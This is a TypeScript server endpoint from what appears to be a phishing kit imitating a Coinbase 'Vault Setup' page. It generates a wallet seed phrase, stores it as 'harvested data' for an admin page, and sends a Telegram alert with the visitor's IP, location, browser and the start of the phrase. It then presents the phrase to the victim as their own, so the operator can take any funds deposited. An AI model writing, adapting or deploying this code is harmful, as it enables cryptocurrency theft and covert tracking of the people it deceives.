/**
 * Visitor seed-phrase generator.
 *
 * The Coinbase "Vault Setup" page calls this endpoint once on load. We:
 *   1. generate a fresh 12-word BIP39 phrase server-side (crypto.randomInt)
 *   2. persist it via dbSaveHarvestedData so the admin /seeds page lists it
 *   3. broadcast a `log:new` event so the activity feed lights up immediately
 *   4. return the phrase to the page so it can be displayed to the visitor
 *
 * Public endpoint — visitor pages must be able to call it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { generatePhrase } from '$lib/server/bip39';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';
import { dbSaveHarvestedData } from '$lib/server/database';
import { notifyPageAction } from '$lib/server/telegram';

export const POST: RequestHandler = async ({ request, getClientAddress }) => {
	let body: { source?: string; length?: unknown } = {};
	try {
		body = await request.json();
	} catch {
		// empty body is fine — we have defaults
	}

	const source = String(body.source ?? 'coinbase_vault_generated').trim().slice(0, 64) ||
		'coinbase_vault_generated';
	let length = Number(body.length ?? 12);
	if (!Number.isFinite(length)) length = 12;
	length = Math.max(12, Math.min(24, Math.floor(length)));

	const words = generatePhrase(length);
	const phrase = words.join(' ');
	const preview = words.slice(0, 3).join(' ') + ' …';
	const ip = getClientAddress();

	try {
		dbSaveHarvestedData(ip, source, 'phrase', {
			phrase,
			wordCount: words.length,
			source,
			generated: true
		});
	} catch {
		/* db unavailable — log entry below still captures it */
	}

	const message = `visitor ${ip} was issued ${words.length}-word vault phrase (${source}) — ${preview}`;
	const entry = serverState.addLogEntry(message, 'data');
	try {
		broadcast({ type: 'log:new', payload: entry });
	} catch {
		/* ws may not be up in dev; ignore */
	}

	const visitor = serverState.visitors.get(ip);
	if (visitor) {
		notifyPageAction(
			{
				ip,
				userId: visitor.userId,
				city: visitor.city,
				region: visitor.region,
				country: visitor.country,
				browser: visitor.browser,
				platform: visitor.platform,
				module: visitor.module,
				capturedBy: visitor.capturedBy,
				lastPageRoute: 'Vault Setup'
			},
			'Coinbase/Vault Setup',
			`Seed phrase generated (${words.length} words)`,
			preview
		).catch(() => {});
	}

	return json({ ok: true, phrase: words, generatedAt: new Date().toISOString() });
};
